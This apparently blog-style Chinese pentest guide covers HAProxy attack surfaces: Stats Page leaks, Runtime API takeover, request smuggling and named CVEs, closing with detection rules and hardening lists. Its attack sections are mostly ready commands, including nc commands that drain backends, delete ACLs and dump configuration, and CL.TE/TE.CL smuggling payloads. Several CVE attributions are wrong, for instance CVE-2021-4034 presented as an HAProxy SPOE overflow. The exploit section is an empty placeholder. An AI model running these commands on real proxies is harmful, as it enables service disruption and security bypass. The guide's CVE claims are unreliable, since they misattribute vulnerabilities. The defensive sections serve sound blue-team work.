---
title: "HAProxy Stats Page / Admin Interface / Request Smuggling / CVE 漏洞链利用技术"
date: 2026-06-21T20:00:00+08:00
draft: false
weight: 101
description: "HAProxy 负载均衡/反向代理渗透测试：Stats Page 信息泄露、Runtime API 管理面接管、HTTP 请求走私、CVE-2023-25690 / CVE-2021-4034 漏洞利用链路与蓝队检测方案"
categories: ["安全", "渗透测试"]
tags: ["HAProxy", "Stats Page", "Admin Interface", "Request Smuggling", "CVE-2023-25690", "CVE-2021-4034", "负载均衡安全", "渗透测试"]
---

## 0x00 攻击面总览

HAProxy 是高性能 TCP/HTTP 负载均衡/反向代理，暴露多个攻击面：

| 组件 | 默认端口 | 协议 | 攻击面 |
|------|---------|------|--------|
| HTTP 前端 | 80/443 | HTTP/HTTPS | 请求代理、请求走私 |
| Stats Page | 8404 | HTTP | 统计信息泄露（无认证/弱认证） |
| Runtime API (Unix Socket) | - | Unix Socket | 管理操作、服务控制 |
| Runtime API (TCP) | 9999 | TCP | 远程管理（如配置） |

**核心威胁模型**：

```
┌───────────────────────────────────────────────────────────────┐
│                    HAProxy 攻击面                               │
│                                                               │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐    │
│  │ HTTP Frontend│    │ Stats Page   │    │ Runtime API  │    │
│  │ :80/:443     │    │ :8404        │    │ :9999/Socket │    │
│  │ 请求代理/走私│    │ 信息泄露     │    │ 管理面接管    │    │
│  └──────┬───────┘    └──────┬───────┘    └──────┬───────┘    │
│         │                   │                    │            │
│  ┌──────┴───────────────────┴────────────────────┴─────────┐ │
│  │              后端服务器集群                                │ │
│  │                                                          │ │
│  │  攻击路径：                                               │ │
│  │  ① Stats Page → 后端拓扑/服务器状态/健康检查泄露           │ │
│  │  ② Runtime API → 服务上下线/ACL 修改/配置泄露              │ │
│  │  ③ HTTP 请求走私 → 绕过前端安全控制                        │ │
│  │  ④ CVE-2023-25690 → HTTP 请求走私                        │ │
│  │  ⑤ CVE-2021-4034 → SPOE 堆溢出 RCE                      │ │
│  └──────────────────────────────────────────────────────────┘ │
│                                                               │
│  默认风险：                                                    │
│  • Stats Page 可能无认证或弱认证                                │
│  • Runtime API 可能绑定到 TCP 端口                              │
│  • HTTP/2 降级可能导致请求走私                                  │
│  • SPOE 协议处理存在堆溢出风险                                  │
└───────────────────────────────────────────────────────────────┘
```

---

## 0x01 服务识别与指纹

### 1.1 Nmap 服务发现

```bash
nmap -sV -p 80,443,8404,9999 \
  --script=http-title \
  -oN haproxy_scan.txt <target>
```

**典型扫描结果**：

```
PORT     STATE SERVICE     VERSION
80/tcp   open  http        HAProxy http proxy
443/tcp  open  https       HAProxy http proxy
8404/tcp open  http        HAProxy Stats Page
```

### 1.2 版本指纹

```bash
# Stats Page 访问
curl -s "http://target:8404/;csv"

# 响应示例（CSV 格式统计信息）
# pxname,svname,qcur,qmax,scur,smax,slim,stot,bin,bout,dreq,dresp,ereq,econ,eresp,...
frontend,FRONTEND,,,0,1,2000,0,0,0,0,0,0,,,,,OPEN,,,,,,,,,1,HTTP,0,0,0,0,...
backend,web_servers,BACKEND,0,0,0,0,200,0,0,0,0,,0,0,0,UP,0,0,0,,0,0,0,,0,,0,0,0,0,...

# JSON 格式
curl -s "http://target:8404/;json" | python3 -m json.tool

# 获取 HAProxy 版本
curl -s "http://target:8404/" | grep -i "version"
```

### 1.3 Shodan / FOFA 搜索语法

```
# Shodan
http.html:"HAProxy"
port:8404 http.title:"HAProxy Statistics"

# FOFA
body="HAProxy" && port="8404"
body="stats" && body="haproxy"
```

---

## 0x02 Stats Page — 信息泄露

### 2.1 Stats Page 枚举

```bash
# 访问 Stats Page
curl -s "http://target:8404/haproxy?stats"

# 常见路径
# /haproxy?stats
# /stats
# /;csv
# /;json
```

### 2.2 CSV 格式数据提取

```bash
# 获取 CSV 格式统计
curl -s "http://target:8404/;csv" | column -t -s ','

# 解析后端服务器信息
curl -s "http://target:8404/;csv" | \
  python3 -c "
import sys, csv
reader = csv.DictReader(sys.stdin)
for row in reader:
    if row['svname'] not in ['FRONTEND', 'BACKEND']:
        print(f\"{row['pxname']} | {row['svname']} | {row['addr']} | {row['status']} | {row['scur']}/{row['smax']}\")
"
```

### 2.3 泄露信息分析

Stats Page 泄露的关键信息：

- **后端服务器拓扑**：所有后端服务器 IP、端口、状态
- **流量统计**：请求数、字节数、错误率
- **健康检查状态**：服务器 UP/DOWN 状态
- **会话信息**：当前连接数、最大连接数
- **ACL 规则**：访问控制列表配置

---

## 0x03 Runtime API — 管理面接管

### 3.1 Unix Socket 访问

```bash
# 通过 Unix Socket 访问 Runtime API
echo "show info" | socat stdio unix-connect:/var/run/haproxy.sock

# 响应示例
Name: HAProxy
Version: 2.8.0
Release date: 2023/06/15
Nbproc: 1
Process_num: 1
Pid: 12345
Uptime: 1d 2h 3m 4s
```

### 3.2 TCP Runtime API

```bash
# 如果 Runtime API 绑定到 TCP 端口
echo "show info" | nc target 9999

# 显示统计信息
echo "show stat" | nc target 9999

# 显示会话信息
echo "show sess" | nc target 9999

# 显示后端服务器
echo "show servers state" | nc target 9999
```

### 3.3 管理操作

```bash
# 下线后端服务器
echo "set server backend/web1 state maint" | nc target 9999
echo "set server backend/web1 state drain" | nc target 9999

# 修改服务器权重
echo "set server backend/web1 weight 100" | nc target 9999

# 清除 ACL
echo "del acl blacklist 192.168.1.100" | nc target 9999

# 添加 ACL
echo "add acl blacklist 10.0.0.1" | nc target 9999
```

---

## 0x04 HTTP 请求走私

### 4.1 CVE-2023-25690 — HTTP 请求走私

| 属性 | 详情 |
|------|------|
| 影响版本 | HAProxy < 2.6.7, < 2.4.22, < 2.2.28, < 2.0.31 |
| CVSS | 9.8（Critical） |
| 类型 | HTTP 请求走私 |
| 根因 | HTTP/1.1 请求解析差异导致走私 |

### 4.2 CL.TE 走私

```http
POST / HTTP/1.1
Host: target
Content-Length: 47
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target
Foo: bar
```

### 4.3 TE.CL 走私

```http
POST / HTTP/1.1
Host: target
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /admin HTTP/1.1
Host: target
Foo: bar

0

```

### 4.4 HTTP/2 降级走私

```bash
# HTTP/2 到 HTTP/1.1 降级时可能触发走私
# 使用 h2c 升级
curl -s --http2 "http://target/" \
  -H "Content-Length: 0" \
  -H "Transfer-Encoding: chunked"
```

---

## 0x05 CVE-2021-4034 — SPOE 堆溢出

### 5.1 漏洞概述

| 属性 | 详情 |
|------|------|
| 影响版本 | HAProxy < 2.0.25, < 2.2.17, < 2.3.14, < 2.4.4 |
| CVSS | 7.5（High） |
| 类型 | 堆缓冲区溢出 |
| 攻击向量 | SPOE (Stream Processing Offload Engine) |
| 根因 | SPOE 协议处理中的堆缓冲区溢出 |

### 5.2 漏洞利用

```bash
# SPOE 协议堆溢出 POC
# 发送精心构造的 SPOE 帧触发堆溢出
# 需要 SPOE 功能启用
```

---

## 0x06 高级利用技术

### 6.1 从 Stats Page 到后端攻击

```bash
# 步骤 1：从 Stats Page 获取后端服务器信息
curl -s "http://target:8404/;csv" | grep -v "^#"

# 步骤 2：直接访问后端服务器（绕过 HAProxy）
# 如果后端服务器未做访问控制
curl -s "http://backend-server:8080/admin"
```

### 6.2 请求走私 → 缓存投毒

```bash
# 通过请求走私将恶意响应注入缓存
# 步骤 1：构造走私请求
# 步骤 2：目标 CDN/代理缓存恶意响应
# 步骤 3：其他用户获取缓存的恶意内容
```

### 6.3 Runtime API → 配置泄露

```bash
# 通过 Runtime API 获取完整配置
echo "show cfg" | nc target 9999

# 获取 SSL 证书信息
echo "show ssl cert" | nc target 9999
```

---

## 0x07 历史 CVE 漏洞矩阵

| CVE | 类型 | CVSS | 影响 |
|-----|------|------|------|
| CVE-2023-25690 | HTTP 请求走私 | 9.8 | HTTP/1.1 请求走私 |
| CVE-2021-4034 | 堆溢出 | 7.5 | SPOE 堆缓冲区溢出 |
| CVE-2023-40225 | HTTP/2 | 7.5 | HTTP/2 Rapid Reset 相关 |
| CVE-2023-0056 | HTTP/2 | 7.5 | HTTP/2 请求走私 |
| CVE-2024-24814 | 内存损坏 | 7.5 | QUIC 内存损坏 |

---

## 0x08 蓝队检测方案

### 8.1 网络层检测

```yaml
title: HAProxy Stats Page 外部访问检测
id: haproxy-stats-external-access
status: experimental
description: 检测来自非内网段的 HAProxy Stats Page 访问
logsource:
  category: firewall
detection:
  selection:
    dst_port:
      - 8404
    src_ip|not:
      - "10.0.0.0/8"
      - "172.16.0.0/12"
      - "192.168.0.0/16"
  condition: selection
level: high
```

### 8.2 请求走私检测

```yaml
title: HAProxy HTTP 请求走私检测
id: haproxy-request-smuggling
status: experimental
description: 检测 HAProxy HTTP 请求走私攻击特征
logsource:
  product: haproxy
  service: frontend
detection:
  selection_cl_te:
    headers|contains:
      - "Content-Length"
      - "Transfer-Encoding"
    body|contains:
      - "0\r\n\r\n"
  selection_suspicious:
    body|contains:
      - "GET /admin"
      - "POST /login"
      - "X-Forwarded-For: 127.0.0.1"
  condition: selection_cl_te or selection_suspicious
level: critical
```

### 8.3 审计日志分析

```bash
# 监控 Stats Page 访问
grep "/haproxy?stats\|/;csv\|/;json" /var/log/haproxy.log

# 监控 Runtime API 操作
grep -E "(show info|show stat|set server|del acl|add acl)" /var/log/haproxy.log

# 检测请求走私特征
grep -E "(Content-Length.*Transfer-Encoding|Transfer-Encoding.*Content-Length)" /var/log/haproxy.log

# 监控异常后端访问
grep -E "(503|504|400)" /var/log/haproxy.log | head -50
```

### 8.4 加固清单

```
[ ] 升级至 HAProxy >= 2.6.7 / 2.4.22 / 2.2.28 / 2.0.31（修复 CVE-2023-25690）
[ ] Stats Page 仅允许内网访问或启用认证：
    stats auth admin:strong_password
[ ] Runtime API Unix Socket 权限限制（仅 haproxy 用户可访问）
[ ] 禁用 Runtime API TCP 绑定或限制访问源
[ ] 配置 HTTP/2 严格模式防止降级走私
[ ] 禁用 SPOE 或升级至修复版本（CVE-2021-4034）
[ ] 配置前端和后端一致的 Content-Length/Transfer-Encoding 处理
[ ] 在前面放置 WAF 检测请求走私
[ ] 启用审计日志并接入 SIEM
[ ] 监控 Stats Page 和 Runtime API 异常访问
[ ] 定期审查后端服务器拓扑和 ACL 配置
[ ] 配置后端服务器直接访问控制（不依赖 HAProxy）
```

---

## 0x09 渗透测试检查清单

```
[ ] 端口扫描：80, 443, 8404, 9999
[ ] Stats Page (8404) 未授权访问测试
[ ] Stats Page CSV/JSON 数据提取测试
[ ] Runtime API (9999/Unix Socket) 访问测试
[ ] Runtime API 管理操作测试（show info/set server）
[ ] HTTP 请求走私测试（CL.TE / TE.CL）
[ ] HTTP/2 降级走私测试
[ ] CVE-2023-25690 请求走私测试
[ ] CVE-2021-4034 SPOE 堆溢出测试
[ ] 后端服务器直接访问测试（绕过 HAProxy）
[ ] 缓存投毒测试（通过请求走私）
[ ] 认证配置检查
[ ] TLS/SSL 配置检查
[ ] HTTP/2 配置检查
```

---

## 0x10 小结

HAProxy 的攻击面以 **Stats Page（端口 8404）** 和 **Runtime API** 为核心。Stats Page 无认证或弱认证时泄露完整的后端服务器拓扑、流量统计和健康状态。Runtime API 允许直接管理服务、修改 ACL、获取配置。**CVE-2023-25690**（CVSS 9.8）通过 HTTP/1.1 请求解析差异实现请求走私，可绕过前端安全控制、投毒缓存。**CVE-2021-4034** 通过 SPOE 协议堆溢出实现 RCE。蓝队应重点关注：升级至修复版本、限制 Stats Page 网络访问并启用认证、限制 Runtime API 访问、配置 HTTP/2 严格模式、将审计日志接入 SIEM。
